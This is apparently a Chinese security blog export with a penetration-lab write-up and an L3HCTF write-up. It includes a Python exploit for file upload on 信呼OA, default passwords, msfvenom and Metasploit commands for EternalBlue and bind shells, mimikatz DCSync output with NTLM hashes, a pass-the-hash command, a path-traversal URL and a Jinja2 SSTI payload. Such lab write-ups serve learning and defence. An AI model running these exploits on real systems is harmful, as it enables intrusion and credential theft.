class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="172-22-1-18"><a href="#172-22-1-18" class="headerlink" title="172.22.1.18"></a>172.22.1.18</h2><p>172.22.1.18是信呼OA，发现有弱密钥登陆<code>admin/admin123</code></p><p>/#信呼安装后默认存在账号diaochan/xiaoqiao/daqiao/rock/zhangfei/zhaozl等用户，密码都是123456</p><p><a href="https://www.cnblogs.com/Error1s/p/16869854.html">信呼v2.2.1文件上传漏洞复现 - 钎劫 - 博客园</a></p><p>如图filecontid为17，即访问<code>task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=17</code></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/2a14a47eb87dab6212423b526937a0cf.png"></p><p>一开始的图片为上传路径</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/71188d2c9a33992084f1de54e1a8a1ad.png"></p><p><code>upload/2025-07/31_21454761.php?1=system("whoam");</code></p><p>还可以</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestssession <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>url_pre <span class="token operator">=</span> <span class="token string">'http://172.22.1.18/'</span>url1 <span class="token operator">=</span> url_pre <span class="token operator">+</span> <span class="token string">'/?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953'</span>url2 <span class="token operator">=</span> url_pre <span class="token operator">+</span> <span class="token string">'/index.php?m=upfile&amp;a=upload&amp;d=&amp;public=1&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913'</span>url3 <span class="token operator">=</span> url_pre <span class="token operator">+</span> <span class="token string">'/task.php?m=qc1oudcos&amp;runt&amp;a=run&amp;fileid=11'</span>data1 <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'rempass'</span><span class="token punctuation">:</span> <span class="token string">'0'</span><span class="token punctuation">,</span>    <span class="token string">'jmpass'</span><span class="token punctuation">:</span> <span class="token string">'false'</span><span class="token punctuation">,</span>    <span class="token string">'device'</span><span class="token punctuation">:</span> <span class="token string">'1625884034525'</span><span class="token punctuation">,</span>    <span class="token string">'type'</span><span class="token punctuation">:</span> <span class="token string">'0'</span><span class="token punctuation">,</span>    <span class="token string">'adminuser'</span><span class="token punctuation">:</span> <span class="token string">'yWwtaW4='</span><span class="token punctuation">,</span>    <span class="token string">'adminpass'</span><span class="token punctuation">:</span> <span class="token string">'yWwtaW4xMjM='</span><span class="token punctuation">,</span>    <span class="token string">'yanzm'</span><span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">}</span>r <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url1<span class="token punctuation">,</span> data<span class="token operator">=</span>data1<span class="token punctuation">)</span>r <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url2<span class="token punctuation">,</span> files<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'file'</span><span class="token punctuation">:</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'1.php'</span><span class="token punctuation">,</span> <span class="token string">'r+'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>filepath <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'filepath'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>filepath <span class="token operator">=</span> <span class="token string">"/"</span> <span class="token operator">+</span> filepath<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.up temp'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'.php'</span><span class="token builtin">id</span> <span class="token operator">=</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span>url3 <span class="token operator">=</span> url_pre <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f'/task.php?m=qc1oudcos&amp;runt&amp;a=run&amp;fileid=</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">id</span><span class="token punctuation">}</span></span><span class="token string">'</span></span>r <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url3<span class="token punctuation">)</span>r <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url_pre <span class="token operator">+</span> filepath <span class="token operator">+</span> <span class="token string">"?1=system('dir')"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r1filepath<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用 proxychains 跑脚本</p><pre class="line-numbers language-none"><code class="language-none">proxychains4 python3 2.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>以同样方式生成后门并链接后门</p><p>然后本地生成一个正向shell的windows的64位后门<br><code>msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=8765 -f exe -o 77.exe</code><br>然后蚁剑上传<br>配置msf</p><pre class="line-numbers language-none"><code class="language-none">proxychains msfconsoleuse exploit/multi/handlerset payload windows/x64/meterpreter/bind_tcpset rhost 172.22.1.18set lport 8765run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="172-22-1-21"><a href="#172-22-1-21" class="headerlink" title="172.22.1.21"></a>172.22.1.21</h2><h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>因为扫出127.022.1.21有永恒之蓝，所以用proxychains和msf直接打</p><p><a href="https://blog.csdn.net/ElsonHY/article/details/109939420">MS17-010（Eternal blue永恒之蓝）漏洞利用+修复方法-CSDN博客</a></p><pre class="line-numbers language-none"><code class="language-none">proxychains msfconsoleuse exploit/windows/smb/ms17_010_eternalblueset payload windows/x64/meterpreter/bind_tcp_uuidset RHOSTS 172.22.1.21exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接获得shell</p><p>还可以ms17_010_command，这里还需要一些参数，我们去18那个机器拿，因为18机器运行gituid后发现为system权限，所以可以利用kiwi模块（使用kiwi模块需要system权限），然后用creds_all获取所有凭证<br><code>load kiwi</code><br><code>creds_all</code></p><pre class="line-numbers language-none"><code class="language-none">Username        Domain    NTLM                              SHA1--------        ------    ----                              ----Charles         XIAORANG  f6a9881cd5ae709abb4ac9ab87f24617  99439e2268d0f5063928f523d5d44c8d69be7e34XIAORANG-OA01$  XIAORANG  dc5f050393a7cc83e0518b8015b8b65d  fc0612848c69ce0b4f2afc76e506289e4bc97bd8XIAORANG-OA01$  XIAORANG  d87c972fc49ec955dd227c1c1ec1beff  e33a635b6cc6c39931023ed2b49805207d7cf57e<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里我们通过XIAORANG-OA01$的NTLM进行伪造，注意，两个NTLM都试一遍，有一个是失效的，同时设置smbpass由于格式为LM:NTLM，但是LM不重要，所以用0填充</p><pre class="line-numbers language-none"><code class="language-none">proxychains msfconsoleuse auxiliary/admin/smb/ms17_010_command            (search ms17_010_command)set payload windows/x64/meterpreter/bind_tcpset rhosts 172.22.1.21set smbpass 00000000000000000000000000000000:d87c972fc49ec955dd227c1c1ec1beffset smbdomain XIAORANG.LABset smbuser XIAORANG-OA01\$set commond whoamiexploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>后续可以利用SMB等方法将后门发上传上去后远程执行即可获取meterpertre</p><h2 id="172-22-1-2"><a href="#172-22-1-2" class="headerlink" title="172.22.1.2"></a>172.22.1.2</h2><p>然后进行DCSync攻击</p><blockquote><p>DCSync利用原理：<br>利用DRS(Directory Replication Service)协议通过IDL_DRSGetNCChanges从域控制器复制用户凭据</p></blockquote><pre class="line-numbers language-none"><code class="language-none">要想使用 DCSync 必须获得以下任一用户的权限：Administrators 组内的用户Domain Admins 组内的用户Enterprise Admins 组内的用户域控制器的计算机帐户<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>我们回到一开始 fscan 的扫描结果，我们用永恒之蓝打下的这台机子是 enterprise 用户，也就是说满足 DCSync 攻击的条件</p><blockquote><ol><li><code>load kiwi</code></li></ol><ul><li>作用：在 Meterpreter 会话中加载 Kiwi 模块（Mimikatz 的 Metasploit 集成版本），该模块用于抓取系统密码、哈希值、票据等敏感信息。</li><li>前提：需要获得系统的管理员权限（通常是 SYSTEM 权限）才能正常加载和使用。</li></ul><ol start="2"><li><code>kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /all /csv</code></li></ol><ul><li><p>这是通过 Kiwi 模块调用 Mimikatz 的</p><pre class="line-numbers language-none"><code class="language-none">lsadump::dcsync<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>命令，主要用于从域控制器（DC）同步用户凭证信息：</p><ul><li><code>lsadump::dcsync</code>：利用域内复制机制（DCSync）从域控制器提取用户哈希等信息，无需直接在 DC 上执行命令。</li><li><code>/domain:xiaorang.lab</code>：指定目标域为<code>xiaorang.lab</code>。</li><li><code>/all</code>：提取域内所有用户的信息。</li><li><code>/csv</code>：以 CSV 格式输出结果，便于后续处理。</li></ul></li></ul></blockquote><pre class="line-numbers language-none"><code class="language-none">导出域内哈希load kiwikiwi_cmd lsadump::dcsync /domain:xiaorang.lab /all /csv[DC] 'xiaorang.lab' will be the domain[DC] 'DC01.xiaorang.lab' will be the DC server[DC] Exporting domain 'xiaorang.lab'[rpc] Service  : ldap[rpc] AuthnSvc : GSS_NEGOTIATE (9)502     krbtgt  fb812eea13a18b7fcdb8e6d67ddc205b        5141106    Marcus  e07510a4284b3c97c8e7dee970918c5c        5121107    Charles f6a9881cd5ae709abb4ac9ab87f24617        5121000    DC01$   4e5dbcda5175afea09f2af7c2026a595        532480500     Administrator   10cf89a850fb1cdbe6bb432b859164c8        5121104    XIAORANG-OA01$  d87c972fc49ec955dd227c1c1ec1beff        40961108    XIAORANG-WIN7$  95d6ad215e1b8d5b63ba9726e9e556b6        4096<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获得了Administrator的hash，再利用crackmapexec进行hash传递（PTH:pass the hash）即可</p><pre class="line-numbers language-none"><code class="language-none">proxychains4 -f /etc/proxychains4.conf crackmapexec smb 172.22.1.2 -u administrator -H 10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x "type Users\Administrator\flag\flag03.txt"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>/#还是proxychains4自己看看</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/7b94d7312a328fec441f3a6208c1f01c.png"></p>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 春秋云镜 </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>L3Hctf</title>
      <link href="/2025/07/20/20125/"/>
      <url>/2025/07/20/20125/</url>
      
        <content type="html"><![CDATA[<p>linux不解析通配符</p><blockquote><h3 id="一、基础通配符（适用于命令行、文件操作）"><a href="#一、基础通配符（适用于命令行、文件操作）" class="headerlink" title="一、基础通配符（适用于命令行、文件操作）"></a><strong>一、基础通配符（适用于命令行、文件操作）</strong></h3><p>这些通配符在 Linux/macOS 的 Bash 终端、Windows 的命令提示符（CMD）或 PowerShell 中常用，主要用于匹配文件名。</p><ol><li><strong><code>\*</code>（星号）</strong><ul><li>匹配 <strong>任意长度的任意字符</strong>（包括空字符）。</li><li>示例：<ul><li><code>*.txt</code>：匹配所有以 <code>.txt</code> 结尾的文件（如 <code>a.txt</code>、<code>b123.txt</code>）。</li><li><code>file*</code>：匹配所有以 <code>file</code> 开头的文件（如 <code>file</code>、<code>file1</code>、<code>file.txt</code>）。</li><li><code>*doc*</code>：匹配文件名中包含 <code>doc</code> 的文件（如 <code>readme.doc</code>、<code>mydoc.pdf</code>）。</li></ul></li></ul></li><li><strong><code>?</code>（问号）</strong><ul><li>匹配 <strong>单个任意字符</strong>（必须有一个字符，不能匹配空）。</li><li>示例：<ul><li><code>file?.txt</code>：匹配 <code>file1.txt</code>、<code>fileA.txt</code>（文件名中 <code>file</code> 后有 1 个字符），但不匹配 <code>file.txt</code>（少一个字符）或 <code>file12.txt</code>（多一个字符）。</li><li><code>?.log</code>：匹配 <code>a.log</code>、<code>1.log</code>（仅 1 个字符 + <code>.log</code>）。</li></ul></li></ul></li><li><strong><code>[]</code>（方括号）</strong><ul><li>匹配 <strong>括号内指定的任意一个字符</strong>，支持范围表示。</li><li>规则：<ul><li><code>[abc]</code>：匹配 <code>a</code>、<code>b</code>、<code>c</code> 中的任意一个字符。</li><li><code>[0-9]</code>：匹配 0-9 中的任意一个数字（范围用 <code>-</code> 分隔）。</li><li><code>[a-z]</code>：匹配小写字母 a-z。</li><li><code>[^abc]</code> 或 <code>[!abc]</code>：匹配 <strong>不在括号内</strong> 的任意一个字符（取反，<code>^</code> 或 <code>!</code> 为取反符号）。</li></ul></li><li>示例：<ul><li><code>file[0-5].txt</code>：匹配 <code>file0.txt</code> 到 <code>file5.txt</code>。</li><li><code>[A-Z]*.pdf</code>：匹配以大写字母开头的 PDF 文件（如 <code>Report.pdf</code>）。</li><li><code>file[!0-9].txt</code>：匹配 <code>fileA.txt</code>、<code>file_.txt</code>，但不匹配 <code>file1.txt</code>。</li></ul></li></ul></li><li><strong><code>{}</code>（花括号）</strong><ul><li>用于 <strong>生成多个字符串组合</strong>，不做匹配，而是直接展开为括号内的所有项。</li><li>示例：<ul><li><code>file{1,2,3}.txt</code>：展开为 <code>file1.txt file2.txt file3.txt</code>（可用于批量创建或操作文件）。</li><li><code>{a,b}*{x,y}</code>：展开为 <code>a*x a*y b*x b*y</code>（结合 <code>*</code> 时先展开再匹配）。</li></ul></li></ul></li></ol><h3 id="二、正则表达式中的通配符（扩展匹配）"><a href="#二、正则表达式中的通配符（扩展匹配）" class="headerlink" title="二、正则表达式中的通配符（扩展匹配）"></a><strong>二、正则表达式中的通配符（扩展匹配）</strong></h3><p>在编程（如 Python、JavaScript）、文本搜索（如 <code>grep</code> 命令）中，正则表达式的通配符功能更强大，需注意与基础通配符的区别：</p><ol><li><strong><code>.</code>（点号）</strong><ul><li>匹配 <strong>单个任意字符</strong>（类似 <code>?</code>，但在正则中更常用）。</li><li>示例：<code>a.b</code> 匹配 <code>aab</code>、<code>a1b</code>、<code>a@b</code>（中间任意一个字符）。</li></ul></li><li><strong><code>.\*</code>（点星组合）</strong><ul><li>匹配 <strong>任意长度的任意字符</strong>（类似 <code>*</code>，但在正则中是贪婪匹配，尽可能多匹配）。</li><li>示例：<code>a.*b</code> 匹配 <code>a123b</code>、<code>aXyZb</code>（<code>a</code> 和 <code>b</code> 之间的所有字符）。</li></ul></li><li><strong><code>^</code> 和 <code>$</code>（锚点）</strong><ul><li><code>^</code>：匹配字符串的 <strong>开头</strong>（如 <code>^hello</code> 匹配以 <code>hello</code> 开头的字符串）。</li><li><code>$</code>：匹配字符串的 <strong>结尾</strong>（如 <code>world$</code> 匹配以 <code>world</code> 结尾的字符串）。</li><li>示例：<code>^abc$</code> 仅匹配字符串 <code>abc</code>（精确匹配，开头和结尾无其他字符）。</li></ul></li><li><strong><code>\d</code>、<code>\w</code>、<code>\s</code>（预定义字符类）</strong><ul><li><code>\d</code>：匹配任意数字（等价于 <code>[0-9]</code>）。</li><li><code>\w</code>：匹配字母、数字或下划线（等价于 <code>[a-zA-Z0-9_]</code>）。</li><li><code>\s</code>：匹配空白字符（空格、制表符 <code>\t</code>、换行符 <code>\n</code> 等）。</li><li>示例：<code>\d{3}</code> 匹配 3 个连续数字（如 <code>123</code>、<code>456</code>）。</li></ul></li></ol><h3 id="三、通配符的使用场景"><a href="#三、通配符的使用场景" class="headerlink" title="三、通配符的使用场景"></a><strong>三、通配符的使用场景</strong></h3><ol><li><p><strong>命令行操作</strong></p><ul><li>批量删除文件：<code>rm *.tmp</code>（删除所有 <code>.tmp</code> 临时文件）。</li><li>批量复制：<code>cp photo_?.jpg ./backup/</code>（复制 <code>photo_1.jpg</code>、<code>photo_2.jpg</code> 到 <code>backup</code> 文件夹）。</li><li>搜索文件：<code>ls [A-Z]*</code>（列出所有大写字母开头的文件）。</li></ul></li><li><p><strong>编程中的字符串匹配</strong></p><ul><li><p>在 Python 中用</p><pre class="line-numbers language-none"><code class="language-none">re<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>模块（正则表达式）：</p><p>python</p><p>运行</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token keyword">if</span> re<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span><span class="token string">r'file\d+\.txt'</span><span class="token punctuation">,</span> <span class="token string">'file123.txt'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"匹配成功"</span><span class="token punctuation">)</span>  <span class="token comment"># 输出：匹配成功（\d+ 匹配1个以上数字）</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p><strong>文件搜索工具</strong></p><ul><li>如 <code>grep</code> 命令：<code>grep 'error.*2023' log.txt</code>（搜索日志中包含 <code>error</code> 且后面跟 <code>2023</code> 的行）。</li></ul></li></ol><h3 id="四、注意事项"><a href="#四、注意事项" class="headerlink" title="四、注意事项"></a><strong>四、注意事项</strong></h3><ol><li><p><strong>不同环境的差异</strong></p><ul><li>Windows 的 CMD 中，<code>*</code> 和 <code>?</code> 用法与 Linux 类似，但不支持 <code>[]</code> 范围匹配；PowerShell 则支持更多通配符（如 <code>[]</code>、<code>*</code>、<code>?</code>）。</li><li>正则表达式中的 <code>*</code> 与命令行的 <code>*</code> 不同：正则中 <code>*</code> 表示 “前面的字符重复 0 次或多次”（如 <code>ab*</code> 匹配 <code>a</code>、<code>ab</code>、<code>abb</code>），而命令行中 <code>*</code> 是独立的通配符。</li></ul></li><li><p><strong>转义字符</strong></p><ul><li><p>若要匹配通配符本身（如文件名含</p><pre class="line-numbers language-none"><code class="language-none">*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>），需用转义符</p><pre class="line-numbers language-none"><code class="language-none">\<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（Linux）或</p><pre class="line-numbers language-none"><code class="language-none">^<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（Windows CMD），例如：</p><ul><li>Linux：<code>ls \*.txt</code>（匹配文件名就是 <code>*.txt</code> 的文件）。</li><li>Windows CMD：<code>dir ^*.txt</code>（同上）。</li></ul></li></ul></li></ol></blockquote><p><a href="https://su-team.cn/posts/e3fd1be7.html#gogogo-chu-fa-lou">https://su-team.cn/posts/e3fd1be7.html#gogogo-chu-fa-lou</a></p><p><a href="https://blog.xmcve.com/2025/07/15/L3HCTF2025-Writeup/#title-6">L3HCTF Writeup - 星盟安全团队</a></p><h3 id="赛博侦探"><a href="#赛博侦探" class="headerlink" title="赛博侦探"></a>赛博侦探</h3><p>点开九子夺嫡视频</p><pre class="line-numbers language-none"><code class="language-none">url为https://www.bilibili.com/video/BV1tT421e7r3/?from_url=http://223.112.5.141:64601/secret/find_my_password&amp;buvid=XU729158D436618067C9318686801E96CB45D&amp;from_spmid=tm.recommend.0.0&amp;is_story_h5=false&amp;p=1&amp;plat_id=116&amp;share_from=ugc&amp;share_medium=android&amp;share_plat=android&amp;share_session_id=422b97e2-06ad-4b22-a034-6f23ac237e51&amp;share_source=COPY&amp;share_tag=s_i&amp;spmid=united.player-video-detail.0.0&amp;timestamp=1751785740&amp;unique_k=CB6R8pq&amp;up_id=552601798即为http://223.112.5.141:64601/secret/find_my_password<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>通过doc属性可知邮箱为<a href="mailto:leland@l3hsec.com">leland@l3hsec.com</a>，英文名为leland</p><p>接着根据离羽毛球馆的距离查店铺位置，可推其经纬度为<code>114.175,30.623</code></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/63bf8cecf4cc54acc7c56747399c0713.png"></p><p>通过扫码知航班为MU5399</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/84b4c3cd5ecb3461b04c7c1b65af72a8.png"></p><p>因是从武汉出发，故老家为福州</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/d717c16d0e37b9d31b4ef81fbbc6afdc.png"></p><p>提交答案后转到<a href="http://223.112.5.141:64601/secret/my_lovely_photos%EF%BC%8C%E7%9C%8B%E6%BA%90%E4%BB%A3%E7%A0%81%E5%8F%AF%E7%9F%A5%E4%B8%BA%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%EF%BC%8C%E8%BE%93%E5%85%A5http://223.112.5.141:64601/secret/my_lovely_photo?name=../../../flag%EF%BC%8C%E5%8D%B3%E5%8F%AF%E5%BE%97%E5%88%B0%60L3HCTF%7BF1ndL3l4ndAndTr4v3rs3TheP4th%7D%60">http://223.112.5.141:64601/secret/my_lovely_photos，看源代码可知为路径穿越，输入http://223.112.5.141:64601/secret/my_lovely_photo?name=../../../flag，即可得到`L3HCTF{F1ndL3l4ndAndTr4v3rs3TheP4th}`</a></p><hr><h3 id="best-profile"><a href="#best-profile" class="headerlink" title="best_profile"></a>best_profile</h3><p><a href="https://xz.aliyun.com/news/7291">对缓存投毒的学习总结-先知社区</a></p><blockquote><ul><li><code>X-Forwarded-For: 客户端原始IP, 代理1IP, 代理2IP, ...</code><ul><li>第一个 IP 为客户端真实 IP，后续为请求经过的代理 IP。</li></ul></li><li><strong>示例</strong>：<br>客户端（<code>192.168.1.100</code>）→ 代理 A（<code>10.0.0.1</code>）→ 代理 B（<code>203.0.113.5</code>）→ 后端服务器，请求头为：<br><code>X-Forwarded-For: 192.168.1.100, 10.0.0.1, 203.0.113.5</code></li><li><strong>格式</strong>：单个主机名（或 IP + 端口，端口可选）<br><code>X-Forwarded-Host: 客户端访问的原始域名[:端口]</code></li><li><strong>背景</strong>：<br>当请求经过代理时，代理会与后端服务器建立新连接，此时后端服务器收到的 <code>Host</code> 头可能被代理修改为后端服务器自身的地址（如代理配置的后端服务域名）。<code>X-Forwarded-Host</code> 用于保留客户端最初请求的 <code>Host</code> 信息。</li><li><strong>示例</strong>：<br>客户端访问 <code>https://www.example.com</code>，请求经代理转发到后端服务器 <code>10.0.0.10</code>，代理会：<ul><li>将请求的 <code>Host</code> 头改为 <code>10.0.0.10</code>（后端服务器地址）；</li><li>同时添加 <code>X-Forwarded-Host: www.example.com</code>，告知后端服务器用户实际访问的是 <code>www.example.com</code>。</li></ul></li></ul></blockquote><blockquote><h3 id="X-Forwarded-Host-与-Host-的区别"><a href="#X-Forwarded-Host-与-Host-的区别" class="headerlink" title="X-Forwarded-Host 与 Host 的区别"></a>X-Forwarded-Host 与 Host 的区别</h3><ul><li><strong>Host 头部</strong>：<br>是 HTTP 协议标准头部，由客户端（如浏览器）发送，用于指定请求的目标服务器的域名或 IP 地址及端口，是服务器识别自身应处理哪个站点请求的核心依据（尤其在虚拟主机场景）。例如，访问 <code>https://example.com/path</code> 时，Host 头部通常为 <code>example.com</code>。</li><li><strong>X-Forwarded-Host 头部</strong>：<br>是非标准但广泛使用的扩展头部，由反向代理服务器（如 Nginx、Apache 等）添加，用于传递客户端原始请求中的 Host 信息。当请求经过代理服务器转发到后端服务器时，后端服务器通过该头部可获取客户端最初请求的目标域名，而非代理服务器的地址。</li></ul><h3 id="核心差异"><a href="#核心差异" class="headerlink" title="核心差异"></a>核心差异</h3><table><thead><tr><th>头部</th><th>发送方</th><th>作用</th><th>典型场景</th></tr></thead><tbody><tr><td>Host</td><td>客户端</td><td>指示请求的目标服务器域名 / IP</td><td>直接向服务器发起请求</td></tr><tr><td>X-Forwarded-Host</td><td>反向代理服务器</td><td>传递客户端原始请求的 Host 信息</td><td>存在代理的多层网络架构</td></tr></tbody></table><p>例如，客户端请求 <code>https://proxy.com</code>（代理服务器），实际转发到后端 <code>backend.com</code>，此时：</p><ul><li><p>客户端发送的 Host 为 <code>proxy.com</code></p></li><li><p>代理服务器添加 X-Forwarded-Host 为 <code>proxy.com</code>，后端服务器通过它可知客户端原始目标</p></li><li><p><strong>1. X-Forwarded-For</strong></p><h4 id="作用："><a href="#作用：" class="headerlink" title="作用："></a>作用：</h4><p>记录客户端的<strong>原始 IP 地址</strong>以及请求经过的所有代理服务器的 IP 地址。<br>当请求经过多层代理（如客户端 → 代理服务器 A → 代理服务器 B → 后端服务器）时，后端服务器默认只能看到最后一个代理的 IP，而 <code>X-Forwarded-For</code> 可以追溯完整的请求路径。</p><h4 id="格式："><a href="#格式：" class="headerlink" title="格式："></a>格式：</h4><p>逗号分隔的 IP 地址列表，<strong>第一个地址是客户端原始 IP</strong>，后续是各级代理的 IP。<br>例如：<code>X-Forwarded-For: 192.168.1.100, 10.0.0.1, 172.16.0.2</code></p><ul><li><code>192.168.1.100</code>：客户端真实 IP</li><li><code>10.0.0.1</code>：第一级代理 IP</li><li><code>172.16.0.2</code>：第二级代理 IP</li></ul><h3 id="2-X-Forwarded-Host"><a href="#2-X-Forwarded-Host" class="headerlink" title="2. X-Forwarded-Host"></a><strong>2. X-Forwarded-Host</strong></h3><h4 id="作用：-1"><a href="#作用：-1" class="headerlink" title="作用："></a>作用：</h4><p>记录客户端请求的<strong>原始 Host 头部</strong>（即客户端访问的域名或 IP）。<br>当请求经过反向代理时，代理服务器通常会修改 <code>Host</code> 头部（例如指向后端服务器的内部地址），而 <code>X-Forwarded-Host</code> 用于保留客户端最初请求的 Host 信息。</p></li></ul></blockquote><blockquote><ol><li><strong>利用缓存键（Cache Key）设计缺陷</strong><br>缓存服务器通常根据请求的部分信息（如 URL、Host 头、特定请求参数等）生成 “缓存键”，用于标识唯一资源。若缓存键未包含某些关键参数（如未验证的用户输入、特殊 HTTP 头），攻击者可构造包含恶意内容的请求，使缓存将恶意内容与正常 URL 关联。<br>例如：若缓存仅根据<code>URL</code>生成键，而忽略<code>X-Forwarded-Host</code>头，攻击者可发送包含恶意<code>X-Forwarded-Host</code>的请求，使缓存将恶意脚本与正常 URL 绑定，其他用户访问该 URL 时会加载恶意脚本。</li><li><strong>注入恶意代码到可缓存资源</strong><br>若源服务器对用户输入过滤不严，攻击者可提交包含恶意代码（如 XSS 脚本、恶意 JS）的内容，并诱导缓存服务器将其作为 “静态资源”（如<code>.js</code>、<code>.css</code>文件）缓存。当其他用户加载该资源时，恶意代码会被执行。<br>例如：在用户可控的动态页面中注入恶意 JS，若该页面被缓存，所有访问者都会触发 JS 执行。</li><li><strong>利用 HTTP 响应头漏洞</strong><br>若源服务器返回的响应头包含错误的缓存控制信息（如<code>Cache-Control: public</code>，允许缓存），或缓存服务器忽略了源服务器的缓存限制（如<code>no-cache</code>），攻击者可通过构造请求，使恶意内容被长期缓存。</li></ol></blockquote><blockquote><h4 id="1-render-template-的安全特性"><a href="#1-render-template-的安全特性" class="headerlink" title="1. render_template 的安全特性"></a>1. <code>render_template</code> 的安全特性</h4><ul><li><p>自动转义</p><p>：默认对变量输出进行 HTML 转义，防止 XSS 攻击。</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!-- 模板文件 index.html --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>Hello, {{ name }}!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 当 name = '&lt;script&gt;alert(1)&lt;/script&gt;' 时 --&gt;</span><span class="token comment">&lt;!-- 输出结果：&lt;p&gt;Hello, &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;!&lt;/p&gt; --&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>沙箱环境</strong>：模板中无法直接访问 Python 全局对象（如 <code>os</code>、<code>sys</code>），限制代码执行能力。</p></li></ul><h4 id="2-render-template-string-的风险"><a href="#2-render-template-string-的风险" class="headerlink" title="2. render_template_string 的风险"></a>2. <code>render_template_string</code> 的风险</h4><ul><li><p>直接执行模板代码</p><p>：字符串中的任何 Jinja2 语法都会被执行。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">template <span class="token operator">=</span> <span class="token string">"{{ 1+1 }}"</span>  <span class="token comment"># 计算表达式</span>render_template_string<span class="token punctuation">(</span>template<span class="token punctuation">)</span>  <span class="token comment"># 输出 "2"</span>              <span class="token comment"># 危险示例：执行任意 Python 代码</span>payload <span class="token operator">=</span> <span class="token string">"{{ request.application.__globals__['os'].popen('id').read() 